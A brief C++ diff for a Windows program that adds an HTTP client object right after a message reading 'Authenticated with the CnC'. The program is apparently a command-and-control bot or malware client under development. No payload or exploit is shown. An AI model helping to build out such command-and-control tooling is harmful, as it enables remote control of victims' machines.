@@ -6,6 +6,7 @@
 #include <Windows.h>
 #include <WinSock2.h>
 #include <WS2tcpip.h>
+#include "HTTPClient.h"
 
 void DebugMode();
 void Main();
@@ -92,6 +93,8 @@ void Main() {
 	}
 
 	std::cout << "[SUCCESS] Authenticated with the CnC" << std::endl;
+
+	HTTPClient http { };
 }
 
 void DebugMode() {
